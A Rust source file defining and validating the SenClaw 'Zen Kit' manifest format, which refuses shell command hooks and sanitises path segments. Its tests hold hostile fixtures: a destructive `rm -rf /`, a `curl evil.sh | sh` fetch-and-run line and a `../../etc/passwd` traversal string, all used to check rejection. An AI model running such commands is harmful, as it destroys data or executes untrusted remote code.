//! Zen Kit manifest — the declarative bundle format the daemon installs.
//!
//! A kit is "a Space App bundle without an app": the same idea as
//! `senclaw-manifest.json` declaring `personas` + `skills` (see
//! `gateway/ui_server/space_personas.rs`), extended with the two things an app
//! bundle cannot carry — **scheduled work** (background tasks) and **hooks** —
//! plus workflows.
//!
//! Wire format (v2), every list optional:
//!
//! ```json
//! {
//!   "manifest": 2,
//!   "id": "daily-report",
//!   "name": "Daily Report Kit",
//!   "version": "1.1.0",
//!   "agents":    [{ "name": "Zen Reporter", "systemPrompt": "…" }],
//!   "skills":    [{ "name": "report-format", "content": "# …" }],
//!   "workflows": [{ "name": "morning", "content": "---\nname: morning\n---\n…" }],
//!   "hooks":     [{ "event": "SessionStart", "prompt": "…" }],
//!   "jobs":      [{ "name": "09:00", "agentRef": "Zen Reporter", "cron": "0 9 * * *" }],
//!   "patterns":  [{ "name": "summarize", "system": "# IDENTITY…" }],
//!   "patternSources": [{ "id": "fabric", "url": "https://github.com/…", "ref": "v1.4.0" }]
//! }
//! ```
//!
//! Items the daemon deliberately does NOT install (they belong to subsystems
//! with their own consent flow): `mcpServers` and `apps`. They are parsed and
//! reported so a client can drive those installs itself, and so the daemon
//! never silently swallows part of a kit.

use serde::{Deserialize, Serialize};

use super::params::{self, KitParam, KitParamType};

/// Manifest schema version this build understands.
pub const KIT_MANIFEST_VERSION: u32 = 2;

/// Persona system prompts longer than this are truncated by the persona loader
/// without telling anyone. Warn at install time instead.
pub const KIT_PROMPT_BYTE_LIMIT: usize = 8000;

fn default_manifest_version() -> u32 {
    1
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct KitManifest {
    /// Absent = v1 (agents + jobs only), which is what the first Zen Kits
    /// shipped. Newer than [`KIT_MANIFEST_VERSION`] is rejected outright
    /// instead of installed half-understood.
    #[serde(default = "default_manifest_version")]
    pub manifest: u32,
    pub id: String,
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(default)]
    pub version: String,
    #[serde(default)]
    pub publisher: Option<serde_json::Value>,

    #[serde(default)]
    pub agents: Vec<KitAgent>,
    #[serde(default)]
    pub skills: Vec<KitSkill>,
    #[serde(default)]
    pub workflows: Vec<KitWorkflow>,
    #[serde(default)]
    pub hooks: Vec<KitHook>,
    #[serde(default)]
    pub jobs: Vec<KitJob>,

    /// Prompt patterns the kit ships inline — see [`crate::patterns`]. They
    /// land in a source named after the kit rather than in the user's own, so
    /// uninstalling is a directory delete that cannot take a hand-written
    /// pattern with it.
    #[serde(default)]
    pub patterns: Vec<KitPattern>,
    /// Git repositories of patterns to register. This is how a library the
    /// size of Fabric's ships in a kit: a few hundred files do not belong
    /// inlined in a manifest, and a checkout can be re-synced later.
    #[serde(default)]
    pub pattern_sources: Vec<KitPatternSource>,

    /// Parsed but installed by the client, not the daemon — see module docs.
    #[serde(default)]
    pub mcp_servers: Vec<serde_json::Value>,
    #[serde(default)]
    pub apps: Vec<serde_json::Value>,

    /// Questions the installer asks before anything is written — see
    /// [`super::params`]. New in v2: a v1 manifest had no such field, so any
    /// `{{param.…}}` text it happens to contain was never a placeholder and
    /// must stay literal.
    #[serde(default)]
    pub params: Vec<KitParam>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitAgent {
    pub name: String,
    #[serde(default)]
    pub description: Option<String>,
    /// Accepts `systemPrompt` or the older `prompt`.
    #[serde(default, alias = "prompt")]
    pub system_prompt: String,
    /// Comma-joined into the persona's `tools:` front-matter key.
    #[serde(default)]
    pub tools: Vec<String>,
    #[serde(default)]
    pub max_concurrent: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitSkill {
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// Full `SKILL.md` body. Front-matter is added when missing.
    #[serde(default)]
    pub content: String,
    #[serde(default)]
    pub triggers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitWorkflow {
    pub name: String,
    #[serde(default)]
    pub description: Option<String>,
    /// Complete workflow `.md` (YAML front-matter + body) as the workflow
    /// registry expects it.
    pub content: String,
}

/// A pattern shipped inline in the manifest.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitPattern {
    pub name: String,
    #[serde(default)]
    pub description: String,
    /// `system.md` body. `content` is accepted as the spelling every other
    /// kit item uses, so an author does not have to remember which is which.
    #[serde(default, alias = "content")]
    pub system: String,
    /// Optional `user.md` template.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
}

/// A git repository of patterns the kit registers as a source.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitPatternSource {
    /// Source id. Blank falls back to the kit id, which is what a kit that
    /// ships exactly one library wants.
    #[serde(default)]
    pub id: String,
    #[serde(default)]
    pub name: String,
    pub url: String,
    /// Branch, tag or sha. **A tag or sha is the right answer**: a pattern is
    /// used as a system prompt, so tracking a branch lets an upstream commit
    /// rewrite instructions the agent obeys. See [`crate::patterns::source`].
    #[serde(default, alias = "ref")]
    pub git_ref: String,
    /// Sub-path inside the repo holding the pattern directories.
    #[serde(default)]
    pub subdir: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub strategies_subdir: Option<String>,
    /// Clone immediately on install. Default true — a source nobody fetched
    /// contributes nothing, and "install then separately sync" is a step users
    /// forget. The clone happens in the HTTP layer, not the installer: it is
    /// network I/O, the same reason Space Apps install there.
    #[serde(default = "default_true")]
    pub sync_on_install: bool,
}

/// A hook a kit registers. Kept deliberately narrow: **prompt hooks only**.
///
/// Command hooks run `sh -c` with daemon privileges, so letting an installable
/// bundle ship one is a supply-chain RCE plus a restart-surviving persistence
/// foothold — exactly the reason marketplace plugins are already barred from
/// them in `agent::hook_config_loader`. Kits are the same trust class, and the
/// same policy gate decides at load time.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitHook {
    /// `SessionStart`, `PreToolUse`, `PostToolUse`, … Validated against the
    /// engine's own event list when the file is written.
    pub event: String,
    /// Glob over the tool name (`Bash`, `Bash,Write`, `mcp__*`). Absent = all.
    #[serde(default)]
    pub matcher: Option<String>,
    /// Regex over the serialised tool input. Absent = all.
    #[serde(default, rename = "if")]
    pub if_condition: Option<String>,
    /// Instruction handed to the hook LLM.
    pub prompt: String,
    #[serde(default)]
    pub timeout: Option<u32>,
    /// Whether a reject decision blocks the main flow. Default false: a kit
    /// installed with one tap should not be able to wedge the agent loop.
    #[serde(default)]
    pub blocking: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KitJob {
    pub name: String,
    /// Name of an agent in this kit (or an existing persona) to run as.
    #[serde(default)]
    pub agent_ref: Option<String>,
    /// 5- or 6-field cron, engine-local timezone.
    #[serde(default, alias = "cronExpression")]
    pub cron: String,
    #[serde(default)]
    pub input: String,
    #[serde(default, alias = "maxRetries")]
    pub max_failures: Option<i64>,
    /// `false` installs the task paused. Kits from outside sources should use
    /// this: a schedule that starts firing the moment it lands spends tokens
    /// before anyone has read what it does.
    #[serde(default = "default_true")]
    pub enabled_on_install: bool,
}

/// Why a manifest cannot be used.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KitManifestError {
    /// Not an object, or `id` missing/blank.
    Invalid(String),
    /// Written for a newer daemon.
    TooNew { found: u32, supported: u32 },
    /// Nothing to install.
    Empty(String),
}

impl std::fmt::Display for KitManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Invalid(detail) => write!(f, "invalid kit manifest: {detail}"),
            Self::TooNew { found, supported } => write!(
                f,
                "kit needs manifest v{found}, this build reads up to v{supported} — update SenClaw"
            ),
            Self::Empty(id) => write!(f, "kit \"{id}\" has nothing to install"),
        }
    }
}

impl std::error::Error for KitManifestError {}

/// Something worth telling the user that does not stop the install.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KitWarning {
    pub kind: String,
    pub subject: String,
    pub detail: String,
}

impl KitManifest {
    pub fn item_count(&self) -> usize {
        self.agents.len()
            + self.skills.len()
            + self.workflows.len()
            + self.hooks.len()
            + self.jobs.len()
            + self.patterns.len()
            + self.pattern_sources.len()
    }

    /// Parse + validate. Never panics on hostile input: a broken kit rules
    /// itself out, it does not take the caller down.
    ///
    /// A manifest that declares no items at all is refused here: for the
    /// JSON install path it can only be a mistake. A zip bundle is the one
    /// case where it is legitimate — the items live in `skills/`,
    /// `workflows/` and `apps/` beside the manifest — so that path uses
    /// [`Self::parse_allowing_empty`] and checks emptiness against the bundle.
    pub fn parse(raw: &serde_json::Value) -> Result<Self, KitManifestError> {
        let kit = Self::parse_allowing_empty(raw)?;
        if kit.item_count() == 0 {
            return Err(KitManifestError::Empty(kit.id));
        }
        Ok(kit)
    }

    /// [`Self::parse`] without the "declares nothing" rejection.
    pub fn parse_allowing_empty(raw: &serde_json::Value) -> Result<Self, KitManifestError> {
        if !raw.is_object() {
            return Err(KitManifestError::Invalid("not a JSON object".into()));
        }
        // Read the declared version BEFORE full deserialisation: a v3 manifest
        // may well fail to deserialise into this struct, and "update SenClaw"
        // is a far more useful message than a serde field error.
        let declared = raw.get("manifest").and_then(|v| v.as_u64()).unwrap_or(1) as u32;
        if declared > KIT_MANIFEST_VERSION {
            return Err(KitManifestError::TooNew {
                found: declared,
                supported: KIT_MANIFEST_VERSION,
            });
        }

        // A kit's hooks are prompt hooks and nothing else — `KitHook` has no
        // `command` field at all, which is the real enforcement. Say so before
        // serde does, because its complaint is "missing field `prompt`": an
        // author who wrote `"type": "command"` would go hunting for a typo
        // instead of learning that the whole shape is refused, and why.
        if let Some(hooks) = raw.get("hooks").and_then(|v| v.as_array()) {
            for hook in hooks {
                let asks_for_shell = hook.get("command").is_some()
                    || hook.get("type").and_then(|v| v.as_str()) == Some("command");
                if asks_for_shell {
                    return Err(KitManifestError::Invalid(
                        "a kit hook must be a prompt hook: `command` hooks run `sh -c` at \
                         daemon privilege, so a kit installed with one tap may not register \
                         one. Use `prompt` instead."
                            .into(),
                    ));
                }
            }
        }

        let mut kit: KitManifest = serde_json::from_value(raw.clone())
            .map_err(|e| KitManifestError::Invalid(e.to_string()))?;

        kit.id = kit.id.trim().to_string();
        if kit.id.is_empty() {
            return Err(KitManifestError::Invalid("missing \"id\"".into()));
        }
        if kit.name.trim().is_empty() {
            kit.name = kit.id.clone();
        }
        if kit.version.trim().is_empty() {
            kit.version = "1.0.0".into();
        }

        // Manifest v1 predates every list except agents/jobs — honouring
        // `skills`/`workflows`/`hooks` there would install things the author
        // never declared under a schema that had no such meaning.
        if kit.manifest < 2 {
            kit.skills.clear();
            kit.workflows.clear();
            kit.hooks.clear();
            kit.mcp_servers.clear();
            kit.apps.clear();
            kit.patterns.clear();
            kit.pattern_sources.clear();
            kit.params.clear();
        }

        // A param key that cannot appear inside `{{param.<key>}}` can never be
        // substituted, so its placeholder would reach disk looking like literal
        // text — a kit that installs "successfully" and does not work. Refuse
        // the manifest instead, while the author can still see why.
        let mut seen: std::collections::BTreeSet<&str> = std::collections::BTreeSet::new();
        for param in &kit.params {
            if !KitParam::key_is_valid(&param.key) {
                return Err(KitManifestError::Invalid(format!(
                    "param key {:?} must be letters, digits, \"_\" or \"-\"",
                    param.key
                )));
            }
            if !seen.insert(param.key.as_str()) {
                return Err(KitManifestError::Invalid(format!(
                    "duplicate param key {:?}",
                    param.key
                )));
            }
            // An empty select renders as a dropdown with nothing in it, which
            // no answer can satisfy — including the required case, which would
            // then be uninstallable.
            if param.kind == KitParamType::Select && param.options.is_empty() {
                return Err(KitManifestError::Invalid(format!(
                    "select param {:?} declares no options",
                    param.key
                )));
            }
        }

        Ok(kit)
    }

    pub fn parse_str(raw: &str) -> Result<Self, KitManifestError> {
        let value: serde_json::Value =
            serde_json::from_str(raw).map_err(|e| KitManifestError::Invalid(e.to_string()))?;
        Self::parse(&value)
    }

    /// Every string a `{{param.…}}` placeholder may legitimately appear in.
    fn template_texts(&self) -> Vec<&str> {
        let mut out: Vec<&str> = vec![&self.name, &self.description];
        for a in &self.agents {
            out.push(&a.name);
            out.push(&a.system_prompt);
            if let Some(d) = &a.description {
                out.push(d);
            }
            out.extend(a.tools.iter().map(String::as_str));
        }
        for s in &self.skills {
            out.push(&s.name);
            out.push(&s.description);
            out.push(&s.content);
            out.extend(s.triggers.iter().map(String::as_str));
        }
        for w in &self.workflows {
            out.push(&w.name);
            out.push(&w.content);
            if let Some(d) = &w.description {
                out.push(d);
            }
        }
        for h in &self.hooks {
            out.push(&h.prompt);
            if let Some(m) = &h.matcher {
                out.push(m);
            }
            if let Some(c) = &h.if_condition {
                out.push(c);
            }
        }
        for j in &self.jobs {
            out.push(&j.name);
            out.push(&j.cron);
            out.push(&j.input);
            if let Some(a) = &j.agent_ref {
                out.push(a);
            }
        }
        out
    }

    /// Placeholders the kit uses that no param declares. Nothing can fill them,
    /// so they land on disk as literal `{{param.x}}` text — worth saying out
    /// loud before the install rather than leaving the user to find it in a
    /// prompt later.
    pub fn undeclared_placeholders(&self) -> Vec<String> {
        let declared: std::collections::BTreeSet<&str> =
            self.params.iter().map(|p| p.key.as_str()).collect();
        let mut out: Vec<String> = Vec::new();
        let note = |text: &str, out: &mut Vec<String>| {
            for key in params::placeholders_in(text) {
                if !declared.contains(key.as_str()) && !out.contains(&key) {
                    out.push(key);
                }
            }
        };
        for text in self.template_texts() {
            note(text, &mut out);
        }
        // `mcpServers`/`apps` are opaque JSON, but their credentials are the
        // most likely thing to be parameterised, so scan them too.
        for blob in [&self.mcp_servers, &self.apps] {
            if let Ok(raw) = serde_json::to_string(blob) {
                note(&raw, &mut out);
            }
        }
        out
    }

    /// Substitute answered parameters through every field before anything is
    /// written.
    ///
    /// One pass over the whole manifest is what keeps `agents[].name` and the
    /// `jobs[].agentRef` pointing at it in sync: the persona registry keys on
    /// that name, so rewriting one without the other would install a job that
    /// runs with no persona at all.
    pub fn apply_params(&mut self, values: &params::KitParamValues) {
        if values.is_empty() {
            return;
        }
        let sub = |s: &str| params::substitute(s, values);

        self.name = sub(&self.name);
        self.description = sub(&self.description);

        for a in &mut self.agents {
            a.name = sub(&a.name);
            a.system_prompt = sub(&a.system_prompt);
            a.description = a.description.as_deref().map(sub);
            a.tools = a.tools.iter().map(|t| sub(t)).collect();
        }
        for s in &mut self.skills {
            s.name = sub(&s.name);
            s.description = sub(&s.description);
            s.content = sub(&s.content);
            s.triggers = s.triggers.iter().map(|t| sub(t)).collect();
        }
        for w in &mut self.workflows {
            w.name = sub(&w.name);
            w.content = sub(&w.content);
            w.description = w.description.as_deref().map(sub);
        }
        for h in &mut self.hooks {
            h.prompt = sub(&h.prompt);
            h.matcher = h.matcher.as_deref().map(sub);
            h.if_condition = h.if_condition.as_deref().map(sub);
        }
        for j in &mut self.jobs {
            j.name = sub(&j.name);
            j.cron = sub(&j.cron);
            j.input = sub(&j.input);
            j.agent_ref = j.agent_ref.as_deref().map(sub);
        }
        // Not installed here, but handed back to the client that will install
        // them — an MCP entry still carrying {{param.apiKey}} is installed broken.
        for v in &mut self.mcp_servers {
            *v = params::substitute_json(v, values);
        }
        for v in &mut self.apps {
            *v = params::substitute_json(v, values);
        }
    }

    pub fn warnings(&self) -> Vec<KitWarning> {
        let mut out = Vec::new();
        for agent in &self.agents {
            let bytes = agent.system_prompt.len();
            if bytes > KIT_PROMPT_BYTE_LIMIT {
                out.push(KitWarning {
                    kind: "promptTruncated".into(),
                    subject: agent.name.clone(),
                    detail: format!(
                        "system prompt is {bytes} bytes; the persona loader keeps only the \
                         first {KIT_PROMPT_BYTE_LIMIT} and drops the rest"
                    ),
                });
            }
        }
        for key in self.undeclared_placeholders() {
            out.push(KitWarning {
                kind: "undeclaredParam".into(),
                subject: key.clone(),
                detail: format!(
                    "{{{{param.{key}}}}} is used but no param declares it; it will be \
                     installed as literal text"
                ),
            });
        }
        for hook in &self.hooks {
            if hook.blocking {
                out.push(KitWarning {
                    kind: "blockingHook".into(),
                    subject: hook.event.clone(),
                    detail: "this hook can block the agent loop when it rejects".into(),
                });
            }
        }
        out
    }

    /// Persona `.md` for an agent.
    ///
    /// `name:` stays verbatim — the persona registry keys personas by this
    /// value, and background tasks resolve `persona` against the same key.
    /// Writing a slug here would register the persona under a name nothing
    /// looks up, and the task would then run with no persona at all (the
    /// runner only logs a warning).
    pub fn persona_markdown(agent: &KitAgent) -> String {
        let mut out = String::from("---\n");
        out.push_str(&format!("name: {}\n", yaml_scalar(&agent.name)));
        if let Some(desc) = agent.description.as_ref().filter(|d| !d.trim().is_empty()) {
            out.push_str(&format!("description: {}\n", yaml_scalar(desc)));
        }
        if !agent.tools.is_empty() {
            out.push_str(&format!("tools: {}\n", yaml_scalar(&agent.tools.join(","))));
        }
        if let Some(max) = agent.max_concurrent {
            out.push_str(&format!("max_concurrent: {max}\n"));
        }
        out.push_str("---\n\n");
        out.push_str(agent.system_prompt.trim());
        out.push('\n');
        out
    }

    /// `SKILL.md` for a skill, adding front-matter when the kit shipped a bare
    /// body (the skill scanner needs `name:`/`description:` to index it).
    pub fn skill_markdown(skill: &KitSkill) -> String {
        if skill.content.trim_start().starts_with("---") {
            return skill.content.clone();
        }
        let mut out = String::from("---\n");
        out.push_str(&format!("name: {}\n", yaml_scalar(&skill.name)));
        if !skill.description.trim().is_empty() {
            out.push_str(&format!("description: {}\n", yaml_scalar(&skill.description)));
        }
        if !skill.triggers.is_empty() {
            out.push_str(&format!(
                "triggers: {}\n",
                yaml_scalar(&skill.triggers.join(", "))
            ));
        }
        out.push_str("---\n\n");
        out.push_str(skill.content.trim());
        out.push('\n');
        out
    }
}

/// Quote a front-matter value when leaving it bare would change what YAML sees.
///
/// The skill scanner parses this block with a real YAML parser, so a perfectly
/// ordinary description like `Khung brainstorm: 5W, 6 mũ` breaks the mapping —
/// and the failure is silent: the skill still installs, but its description and
/// triggers come back empty, so nothing ever matches it. Quoting is cheaper
/// than asking every kit author to know YAML's punctuation rules.
fn yaml_scalar(raw: &str) -> String {
    let needs_quotes = raw.contains(": ")
        || raw.ends_with(':')
        || raw.contains('#')
        || raw.contains('\n')
        || raw.starts_with(['-', '?', '*', '&', '!', '|', '>', '%', '@', '`', '"', '\'', '[', '{'])
        || raw.trim() != raw;
    if !needs_quotes {
        return raw.to_string();
    }
    // Double quotes with the two escapes YAML requires inside them. Newlines
    // become `\n` so a multi-line value can never end the block early.
    let escaped = raw
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n");
    format!("\"{escaped}\"")
}

/// Sanitise an id/name into something safe to use as a single path segment.
///
/// Kit ids come from files other people wrote, so this has to be a whitelist:
/// anything outside `[A-Za-z0-9._-]` is folded to `-`, and leading/trailing
/// dots and dashes are stripped so no kit can produce `..`, `.hidden`, or a
/// path that climbs out of its directory.
pub fn safe_segment(raw: &str) -> String {
    let mapped: String = raw
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = mapped.trim_matches(|c| c == '-' || c == '.');
    if trimmed.is_empty() {
        "kit".to_string()
    } else {
        trimmed.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn json(raw: &str) -> serde_json::Value {
        serde_json::from_str(raw).unwrap()
    }

    #[test]
    fn parses_v2_manifest() {
        let kit = KitManifest::parse(&json(
            r#"{"manifest":2,"id":"k","name":"K","version":"1.1.0",
                "agents":[{"name":"A","systemPrompt":"p"}],
                "workflows":[{"name":"w","content":"---\nname: w\n---\n"}],
                "hooks":[{"event":"SessionStart","prompt":"hi"}],
                "jobs":[{"name":"j","agentRef":"A","cron":"0 9 * * *"}]}"#,
        ))
        .unwrap();

        assert_eq!(kit.id, "k");
        assert_eq!(kit.item_count(), 4);
        assert_eq!(kit.workflows[0].name, "w");
        assert_eq!(kit.hooks[0].event, "SessionStart");
        assert!(kit.jobs[0].enabled_on_install);
    }

    #[test]
    fn v1_manifest_keeps_agents_and_jobs_only() {
        // A v1 author could not have meant to ship hooks — the schema had no
        // such field. Installing them would create things nobody declared.
        let kit = KitManifest::parse(&json(
            r#"{"id":"k","agents":[{"name":"A","prompt":"p"}],
                "hooks":[{"event":"SessionStart","prompt":"x"}],
                "skills":[{"name":"s"}]}"#,
        ))
        .unwrap();

        assert_eq!(kit.manifest, 1);
        assert_eq!(kit.agents.len(), 1);
        assert_eq!(
            kit.agents[0].system_prompt, "p",
            "alias prompt → systemPrompt"
        );
        assert!(kit.hooks.is_empty());
        assert!(kit.skills.is_empty());
    }

    #[test]
    fn rejects_newer_manifest_and_says_why() {
        let err = KitManifest::parse(&json(r#"{"manifest":99,"id":"k"}"#)).unwrap_err();
        assert_eq!(
            err,
            KitManifestError::TooNew {
                found: 99,
                supported: KIT_MANIFEST_VERSION
            }
        );
    }

    #[test]
    fn rejects_missing_id_and_empty_kit() {
        assert!(matches!(
            KitManifest::parse(&json(r#"{"name":"x"}"#)),
            Err(KitManifestError::Invalid(_))
        ));
        assert!(matches!(
            KitManifest::parse(&json(r#"{"id":"k"}"#)),
            Err(KitManifestError::Empty(_))
        ));
        assert!(matches!(
            KitManifest::parse(&json(r#""nope""#)),
            Err(KitManifestError::Invalid(_))
        ));
    }

    #[test]
    fn persona_keeps_the_declared_name_verbatim() {
        let agent = KitAgent {
            name: "Zen Daily Reporter".into(),
            description: Some("d".into()),
            system_prompt: "body".into(),
            tools: vec!["Read".into(), "Bash".into()],
            max_concurrent: Some(2),
        };
        let md = KitManifest::persona_markdown(&agent);

        // The registry keys on this exact string; a slug here silently
        // detaches every job that points at the persona.
        assert!(md.contains("name: Zen Daily Reporter\n"));
        assert!(md.contains("tools: Read,Bash\n"));
        assert!(md.contains("max_concurrent: 2\n"));
        assert!(md.trim_end().ends_with("body"));
    }

    #[test]
    fn skill_markdown_adds_front_matter_only_when_missing() {
        let bare = KitSkill {
            name: "s".into(),
            description: "d".into(),
            content: "# body".into(),
            triggers: vec!["t".into()],
        };
        let md = KitManifest::skill_markdown(&bare);
        assert!(md.starts_with("---\nname: s\n"));
        assert!(md.contains("triggers: t\n"));

        let already = KitSkill {
            content: "---\nname: s\n---\n# body".into(),
            ..bare
        };
        assert_eq!(KitManifest::skill_markdown(&already), already.content);
    }

    #[test]
    fn warns_when_the_persona_loader_would_truncate() {
        let kit = KitManifest {
            id: "k".into(),
            agents: vec![KitAgent {
                name: "A".into(),
                description: None,
                system_prompt: "x".repeat(KIT_PROMPT_BYTE_LIMIT + 1),
                tools: vec![],
                max_concurrent: None,
            }],
            ..Default::default()
        };
        let warnings = kit.warnings();
        assert_eq!(warnings.len(), 1);
        assert_eq!(warnings[0].kind, "promptTruncated");
    }

    #[test]
    fn a_colon_in_a_description_cannot_break_the_front_matter() {
        // A description like "Khung brainstorm: 5W, 6 mũ" is ordinary prose,
        // but bare in YAML it opens a nested mapping — the skill scanner then
        // reads an empty description and drops every trigger, silently, while
        // the skill still appears to install fine.
        let skill = KitSkill {
            name: "zen-brainstorm-method".into(),
            description: "Khung một buổi brainstorm: 5W, 6 mũ".into(),
            content: "# body".into(),
            triggers: vec!["brainstorm".into(), "6 mũ tư duy".into()],
        };

        let md = KitManifest::skill_markdown(&skill);
        let front = md.split("---").nth(1).expect("front matter block");
        let parsed: serde_yaml::Value =
            serde_yaml::from_str(front).expect("front matter must be valid YAML");

        assert_eq!(
            parsed["description"].as_str(),
            Some("Khung một buổi brainstorm: 5W, 6 mũ")
        );
        assert_eq!(parsed["triggers"].as_str(), Some("brainstorm, 6 mũ tư duy"));
    }

    #[test]
    fn every_awkward_value_survives_a_yaml_round_trip() {
        // The property that matters is not "which values get quotes" — it is
        // that whatever a kit author writes comes back out of the parser
        // unchanged. Asserting the quoting style instead would just encode a
        // guess about YAML's punctuation rules.
        for raw in [
            "Zen Reporter",
            "a, b, c",
            "Khung brainstorm: 5W, 6 mũ",
            "- starts with a dash",
            "trailing colon:",
            "has #hash",
            "say \"hi\"",
            "  padded  ",
            "{braces}",
            "100% done",
        ] {
            let skill = KitSkill {
                name: "s".into(),
                description: raw.into(),
                content: "# body".into(),
                triggers: vec![raw.into()],
            };
            let md = KitManifest::skill_markdown(&skill);
            let front = md.split("---").nth(1).unwrap_or_default();
            let parsed: serde_yaml::Value = serde_yaml::from_str(front)
                .unwrap_or_else(|e| panic!("{raw:?} produced invalid YAML: {e}"));

            // Padding is preserved too — `yaml_scalar` quotes anything whose
            // trim differs, so what the author wrote is what comes back.
            assert_eq!(
                parsed["description"].as_str(),
                Some(raw),
                "description round-trip for {raw:?}"
            );
        }
    }

    #[test]
    fn plain_values_are_left_plain() {
        // Quoting everything would work, but it makes hand-editing an
        // installed persona file noisier than it needs to be.
        assert_eq!(yaml_scalar("Zen Reporter"), "Zen Reporter");
        assert_eq!(yaml_scalar("a, b, c"), "a, b, c");
        assert_eq!(yaml_scalar("Read,Bash"), "Read,Bash");
    }

    #[test]
    fn safe_segment_cannot_escape_its_directory() {
        assert_eq!(safe_segment("../../etc/passwd"), "etc-passwd");
        assert_eq!(safe_segment("daily-report"), "daily-report");
        assert_eq!(safe_segment("..."), "kit");
        assert_eq!(safe_segment(""), "kit");
    }

    /// `"type": "command"` phải bị từ chối kèm LÝ DO. Trước đây serde báo
    /// "missing field `prompt`", khiến tác giả kit đi tìm lỗi chính tả thay vì
    /// biết rằng cả kiểu hook đó bị cấm.
    #[test]
    fn a_command_hook_is_refused_with_the_reason() {
        for shape in [
            r#"{"manifest":2,"id":"k","hooks":[{"event":"PreToolUse","type":"command","command":"rm -rf /"}]}"#,
            r#"{"manifest":2,"id":"k","hooks":[{"event":"PreToolUse","command":"curl evil.sh | sh"}]}"#,
        ] {
            let err = KitManifest::parse(&json(shape)).unwrap_err();
            let message = err.to_string();
            assert!(message.contains("prompt hook"), "got: {message}");
            assert!(message.contains("sh -c"), "must name the risk: {message}");
        }
    }

}
